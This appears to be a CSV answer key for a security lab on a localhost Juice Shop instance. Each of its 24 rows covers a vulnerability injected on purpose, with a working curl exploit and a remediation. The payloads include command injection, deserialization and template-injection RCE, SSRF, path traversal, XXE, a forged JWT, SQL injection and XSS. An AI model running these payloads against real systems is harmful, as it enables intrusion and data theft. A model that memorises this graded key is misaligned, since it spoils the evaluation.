"ID","Source","Origin","Name","Category","Severity_or_Difficulty","CWE","CVE","Location","Manual_Reproduction","Remediation","Validated","Reference","Model_Found_YN","RootCause_Correct_YN","Remediation_Valid_YN","Scorer_Notes"
"INJ-02","INJECTED (created for this lab)","ADDED FOR THIS LAB","Server-Side Request Forgery","SSRF","Critical","CWE-918","","GET http://localhost:3000/rest/delivery/track-external?url=","Start a listener: nc -lp 9000 ; then: curl ""http://localhost:3000/rest/delivery/track-external?url=http://127.0.0.1:9000/""  -> the SERVER makes the request to your listener (or fetch an internal URL and its body is returned).","Allowlist permitted hosts/schemes; block private IP ranges and redirects; do not fetch arbitrary user URLs.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-03","INJECTED (created for this lab)","ADDED FOR THIS LAB","Insecure deserialization -> RCE","Injection","Critical","CWE-502","","POST http://localhost:3000/rest/user/preferences/restore","curl -X POST http://localhost:3000/rest/user/preferences/restore -H 'content-type: application/json' -d '{""p"":{""__type"":""fn"",""body"":""function(){ require(\""fs\"").writeFileSync(\""/tmp/pwned_by_deser\"",\""proof\""); return 1; }""}}' ; then: ls -l /tmp/pwned_by_deser  -> file created by the server = code execution.","Never eval/reconstruct code from input; restore only from a schema-validated data format.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-04","INJECTED (created for this lab)","ADDED FOR THIS LAB","OS command injection","Injection","Critical","CWE-78","","GET http://localhost:3000/rest/admin/service-status?host=","curl ""http://localhost:3000/rest/admin/service-status?host=127.0.0.1;id""  -> response 'detail' contains id output, e.g. uid=0(root) gid=0(root).","Use execFile/spawn with an argument array; validate host against a strict pattern; never pass input to a shell.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-05","INJECTED (created for this lab)","ADDED FOR THIS LAB","Path traversal / arbitrary file read","Broken Access Control","High","CWE-22","","GET http://localhost:3000/rest/delivery/receipt?file=","curl ""http://localhost:3000/rest/delivery/receipt?file=../../../../../../etc/passwd""  -> returns the contents of /etc/passwd.","Resolve the path and confirm it stays inside the base directory; reject '..' sequences.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-06","INJECTED (created for this lab)","ADDED FOR THIS LAB","Server-Side Template Injection -> RCE","Injection","Critical","CWE-1336 / CWE-94","","POST http://localhost:3000/rest/notifications/preview","curl -X POST http://localhost:3000/rest/notifications/preview -H 'content-type: application/json' -d '{""template"":""x=${7*191}""}'  -> preview 'x=1337' (server evaluated 7*191). Try ${process.env.PATH} to leak env.","Use a logic-less template engine; never evaluate user input as code.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-07","INJECTED (created for this lab)","ADDED FOR THIS LAB","IDOR / broken object-level authorization","Broken Access Control","High","CWE-639","","GET,PUT http://localhost:3000/rest/user/notes/:id","curl ""http://localhost:3000/rest/user/notes/2""  (no auth) -> returns another user's note containing 'tax id 900-55-1234'.","Enforce that the authenticated user owns the requested object before returning/updating it.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-08","INJECTED (created for this lab)","ADDED FOR THIS LAB","XML External Entity (XXE)","Injection","High","CWE-611","","POST http://localhost:3000/rest/products/import-feed","curl -X POST http://localhost:3000/rest/products/import-feed -H 'content-type: application/xml' --data '<?xml version=""1.0""?><!DOCTYPE r [<!ENTITY x SYSTEM ""file:///etc/hostname"">]><r><name>&x;</name></r>'  -> returns the host's hostname.","Disable DTD and external-entity processing in the XML parser.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-09","INJECTED (created for this lab)","ADDED FOR THIS LAB","JWT alg:none accepted + hardcoded secret","Broken Authentication","High","CWE-347 / CWE-798","","POST http://localhost:3000/rest/partner/verify-token","curl -X POST http://localhost:3000/rest/partner/verify-token -H 'content-type: application/json' -d '{""token"":""eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ.""}'  -> {""valid"":true,""payload"":{""role"":""admin""}} (unsigned forged token accepted).","Reject alg:none; pin the expected algorithm; load the signing secret from the environment, not hardcoded.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-10","INJECTED (created for this lab)","ADDED FOR THIS LAB","Stored XSS","XSS","High","CWE-79","","POST,GET http://localhost:3000/rest/products/:id/questions","curl -X POST http://localhost:3000/rest/products/1/questions -H 'content-type: application/json' -d '{""author"":""x"",""text"":""<script>alert(1)</script>""}' ; then: curl ""http://localhost:3000/rest/products/1/questions""  -> the <script> tag is returned unescaped in the HTML.","Apply contextual output encoding when rendering; sanitize stored HTML.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-11","INJECTED (created for this lab)","ADDED FOR THIS LAB","Open redirect","Broken Access Control","Medium","CWE-601","","GET http://localhost:3000/rest/track/click?url=","curl -sI ""http://localhost:3000/rest/track/click?url=https://evil.example.com"" | grep -i location  -> Location: https://evil.example.com.","Allowlist redirect targets or permit only relative paths.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-12","INJECTED (created for this lab)","ADDED FOR THIS LAB","Mass assignment -> privilege escalation","Broken Access Control","High","CWE-915","","POST http://localhost:3000/rest/user/profile-update","curl -X POST http://localhost:3000/rest/user/profile-update -H 'content-type: application/json' -d '{""email"":""jim@juice-sh.op"",""role"":""admin"",""isAdmin"":true}'  -> returned profile shows role:admin and isAdmin:true.","Bind only an explicit allowlist of user-editable fields; ignore privilege fields from the request body.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-13","INJECTED (created for this lab)","ADDED FOR THIS LAB","SQL injection via ORDER BY","Injection","High","CWE-89","","GET http://localhost:3000/rest/products/catalog?sortBy=","curl -G ""http://localhost:3000/rest/products/catalog"" --data-urlencode ""sortBy=(SELECT 1 FROM nonexistent_table_zzz)""  -> error 'no such table: nonexistent_table_zzz' proves your SQL is parsed; use a CASE subquery for blind boolean exfiltration.","Map sortBy to an allowlist of column names; never concatenate it into the query.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-14","INJECTED (created for this lab)","ADDED FOR THIS LAB","Predictable password-reset code","Broken Authentication","High","CWE-330","","POST http://localhost:3000/rest/user/quick-reset (+ /confirm)","Request a reset for the victim (POST /rest/user/quick-reset {""email"":""admin@juice-sh.op""}), then brute the code = Date.now() base36 + Math.floor(rand*1000) base36 against /rest/user/quick-reset/confirm within the timing window (see answer-key/VERIFY.md check 14) -> victim's password reset.","Generate codes with crypto.randomBytes; add short expiry and rate limiting.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-15","INJECTED (created for this lab)","ADDED FOR THIS LAB","Missing authorization (data export)","Broken Access Control","High","CWE-862","","GET http://localhost:3000/rest/admin/user-stats","curl ""http://localhost:3000/rest/admin/user-stats""  (no auth header) -> returns staff records including passwords, e.g. ops@juice-sh.op / 0psAdminP@ss2023.","Require authentication and an admin-role check on the route.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-16","INJECTED (created for this lab)","ADDED FOR THIS LAB","SQL injection (LIKE clause)","Injection","High","CWE-89","","GET http://localhost:3000/rest/promos/search?code=","curl -G ""http://localhost:3000/rest/promos/search"" --data-urlencode ""code=' UNION SELECT 1,sql,2 FROM sqlite_master -- ""  -> response data array includes SQL CREATE TABLE statements from sqlite_master.","Use parameterized queries with bound placeholders; never interpolate user input into SQL.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-17","INJECTED (created for this lab)","ADDED FOR THIS LAB","Reflected XSS (promo landing)","XSS","Medium","CWE-79","","GET http://localhost:3000/rest/promos/landing/:code","curl ""http://localhost:3000/rest/promos/landing/%3Cscript%3Ealert(1)%3C%2Fscript%3E""  -> HTML response contains the unescaped <script> tag.","HTML-encode all user input before interpolating into page output.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-18","INJECTED (created for this lab)","ADDED FOR THIS LAB","Race condition (promo apply)","Broken Access Control","Medium","CWE-362","","POST http://localhost:3000/rest/promos/apply","curl -X POST http://localhost:3000/rest/promos/apply -H 'content-type: application/json' -d '{""code"":""SUMMER20""}'  (send 10 concurrent requests) -> multiple get ""applied"" even though uses_left=1, because the check-then-decrement is not atomic.","Use an atomic UPDATE with a WHERE clause (e.g., SET uses_left=uses_left-1 WHERE uses_left>0) or a transaction with a row lock.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-19","INJECTED (created for this lab)","ADDED FOR THIS LAB","SQL injection (blind, single-row)","Injection","Critical","CWE-89","","POST http://localhost:3000/rest/coupons/lookup","curl -X POST http://localhost:3000/rest/coupons/lookup -H ""content-type: application/json"" -d ""{""code"":""x' OR 1=1 -- ""}""  -> returns the first coupon row even though code ""x"" does not exist.","Use parameterized queries with bound placeholders.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-20","INJECTED (created for this lab)","ADDED FOR THIS LAB","IDOR (coupon by id)","Broken Access Control","High","CWE-639","","GET http://localhost:3000/rest/coupons/:id","curl ""http://localhost:3000/rest/coupons/3""  -> returns VIPONLY coupon (userId=1) even though it belongs to another user.","Enforce ownership checks: verify the requesting user owns the coupon before returning it.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-21","INJECTED (created for this lab)","ADDED FOR THIS LAB","Regular expression DoS (ReDoS)","Injection","Medium","CWE-1333","","POST http://localhost:3000/rest/coupons/validate","curl -X POST http://localhost:3000/rest/coupons/validate -H 'content-type: application/json' -d '{""pattern"":""^(a+)+$"",""code"":""'$(python3 -c ""print('a'*27)"")'!""}'  -> server takes several seconds (catastrophic backtracking with 27+ chars).","Avoid user-supplied regex patterns; use a safe validation library or pre-compiled patterns.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-22","INJECTED (created for this lab)","ADDED FOR THIS LAB","Improper input validation (gift card amount)","Injection","High","CWE-20","","POST http://localhost:3000/rest/gift-cards/redeem","curl -X POST http://localhost:3000/rest/gift-cards/redeem -H 'content-type: application/json' -d '{""code"":""GC-1001"",""amount"":-99999}'  -> newBalance becomes negative (5000 + (-99999) = -94999), draining the gift card balance below zero.","Validate that amount is a positive number within an allowed range; reject negative values.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-23","INJECTED (created for this lab)","ADDED FOR THIS LAB","Stored XSS (gift card message)","XSS","High","CWE-79","","POST http://localhost:3000/rest/gift-cards/:id/messages","curl -X POST ""http://localhost:3000/rest/gift-cards/1/messages"" -H 'content-type: application/json' -d '{""from"":""x"",""text"":""<script>alert(1)</script>""}'  ; then: curl ""http://localhost:3000/rest/gift-cards/1/messages""  -> HTML contains the unescaped <script> tag.","HTML-encode all user-supplied content before rendering.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-24","INJECTED (created for this lab)","ADDED FOR THIS LAB","Prototype pollution","Injection","High","CWE-1321","","POST http://localhost:3000/rest/gift-cards/configure","curl -X POST http://localhost:3000/rest/gift-cards/configure -H 'content-type: application/json' -d '{""options"":{""__proto__"":{""isAdmin"":true}}}'  -> Object.assign(config, options) sets config.__proto__ to {isAdmin:true}, polluting the config object's prototype (config.isAdmin becomes true via inheritance). The polluted property is server-side and not visible in the JSON response, but the code flaw is confirmed by reading routes/giftCards.ts.","Do not Object.assign untrusted objects; use Object.create(null) or a schema that rejects __proto__/constructor keys.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-25","INJECTED (created for this lab)","ADDED FOR THIS LAB","SQL injection (WHERE filter)","Injection","Critical","CWE-89","","GET http://localhost:3000/rest/wishlists/search?filter=","curl -G ""http://localhost:3000/rest/wishlists/search"" --data-urlencode ""filter=OR 1=1""  -> returns all wishlists regardless of any intended scoping.","Use parameterized queries; never concatenate user input into a WHERE clause.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
